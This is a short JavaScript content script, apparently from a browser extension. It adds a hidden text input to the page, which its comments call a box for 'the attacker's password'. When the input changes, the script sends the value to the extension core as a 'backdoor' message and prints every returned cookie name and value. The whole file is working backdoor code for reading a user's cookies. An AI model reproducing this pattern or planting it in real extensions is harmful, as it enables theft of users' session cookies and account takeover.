function displayCookies(cookies) {
	for (c of cookies) {
		console.log("Name: " + c.name + " | Value: " + c.value);
	}
}

// create hidden input box for the attacker's password
var x = document.createElement("INPUT");
x.setAttribute("type", "text");
x.setAttribute("hidden", "true");
x.setAttribute("id", "mufasa lives");
document.body.appendChild(x);

// listen for the textbox changed event, then ask for cookies from the core extension
x.addEventListener("change", function() {
	chrome.runtime.sendMessage({backdoor: x.value}, function(response) {
		displayCookies(response.cookies);
	});
})

